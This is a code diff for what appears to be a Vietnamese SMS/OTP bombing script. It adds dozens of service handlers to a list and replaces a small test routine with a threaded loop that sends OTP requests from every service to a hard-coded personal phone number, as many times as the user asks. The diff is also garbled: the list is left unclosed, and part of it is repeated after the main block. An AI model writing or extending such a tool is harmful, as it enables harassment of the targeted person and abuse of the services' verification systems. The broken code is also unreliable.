@@ -3347,29 +3347,37 @@ functions = [
     vinfastescooter, taskal, star_t, nhadatvui,
     mocha35, thuongdo, unica, monkeyjunior,
     babilala, edupia, vkids, mytv, ahamove,
+    cathaylife, prepedu, bigm, atmnha, hvb, zodi,
+    dynaminds, gicula, dalatbds, mocha2, jupviec, guvi,
+    aio, fpt, unicar, lozido, pingpush, ting,
+    kanow, butlsms, butlzl, ilokafood, vieclam24h,
+    sobanhangzl, sobanhang, sfin, sapo,
+    truedoc, upos, ghephang, hoatoc247, gotp
 
-
-def test_apis():
-    print("Testing APIs for phone number:", sdt)
-    
-    # Test a few services
-    print("\nTesting TV360...")
-    tv360()
-    
-    time.sleep(1) # Delay between calls
-    
-    print("\nTesting Tiki...")
-    tiki()
-    
-    time.sleep(1)
-    
-    print("\nTesting Momo...")
-    momo()
-
-# Test the APIs
 if __name__ == "__main__":
-    sdt = input("Nhập số điện thoại: ")
-    test_apis()
+    sdt = "0945987331"
+    count = int(input("Nhập số lần: "))
+    print("Bắt đầu gửi OTP...")
+    success = 0 
+    failed = 0
+
+    with concurrent.futures.ThreadPoolExecutor() as executor:
+        for i in range(count):
+            print(f"\nLần {i+1}/{count}")
+            futures = []
+            for func in functions:
+                future = executor.submit(func)
+                futures.append(future)
+                time.sleep(0.1) # Delay to avoid spam
+                
+            for future in concurrent.futures.as_completed(futures):
+                try:
+                    future.result()
+                    success += 1
+                except Exception:
+                    failed += 1
+                    
+    print(f"\nKết quả: Thành công: {success} | Thất bại: {failed}")
 
 
     cathaylife, prepedu, bigm, atmnha, hvb, zodi,
